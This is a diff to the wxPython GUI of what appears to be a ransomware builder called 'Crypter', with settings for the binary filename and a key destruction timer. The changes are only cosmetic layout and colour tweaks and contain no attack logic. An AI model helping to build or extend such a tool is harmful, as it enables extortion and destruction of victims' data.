@@ -105,7 +105,7 @@ class MainFrame ( wx.Frame ):
 		self.MajorVersionLabel.SetFont( wx.Font( 9, 74, 90, 90, False, "Arial Unicode MS" ) )
 		self.MajorVersionLabel.SetToolTipString( u"Major version number. This will be included in the filename of the produced Crypter binary" )
 		
-		bSizer20.Add( self.MajorVersionLabel, 0, wx.ALL|wx.TOP, 7 )
+		bSizer20.Add( self.MajorVersionLabel, 0, wx.ALL, 5 )
 		
 		
 		bSizer20.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
@@ -165,6 +165,8 @@ class MainFrame ( wx.Frame ):
 		bSizer203213.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.FilenameTextCtrl = wx.TextCtrl( BinarySettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.FilenameTextCtrl.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOWTEXT ) )
+		
 		bSizer203213.Add( self.FilenameTextCtrl, 0, wx.ALL, 5 )
 		
 		
@@ -320,6 +322,8 @@ class MainFrame ( wx.Frame ):
 		bSizer2032111.AddSpacer( ( 0, 0), 1, wx.EXPAND, 5 )
 		
 		self.KeyDestructionTimeTextCtrl = wx.TextCtrl( RansomwareSettingsSizer.GetStaticBox(), wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 )
+		self.KeyDestructionTimeTextCtrl.SetForegroundColour( wx.SystemSettings.GetColour( wx.SYS_COLOUR_WINDOWTEXT ) )
+		
 		bSizer2032111.Add( self.KeyDestructionTimeTextCtrl, 0, wx.ALL, 5 )
 		
 		
@@ -392,7 +396,7 @@ class MainFrame ( wx.Frame ):
 		
 		bSizer172 = wx.BoxSizer( wx.VERTICAL )
 		
-		self.BuildProgressGauge = wx.Gauge( self.m_panel4112, wx.ID_ANY, 100, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
+		self.BuildProgressGauge = wx.Gauge( self.m_panel4112, wx.ID_ANY, 99, wx.DefaultPosition, wx.DefaultSize, wx.GA_HORIZONTAL )
 		self.BuildProgressGauge.SetValue( 0 ) 
 		bSizer172.Add( self.BuildProgressGauge, 1, wx.ALL|wx.EXPAND, 5 )
 		
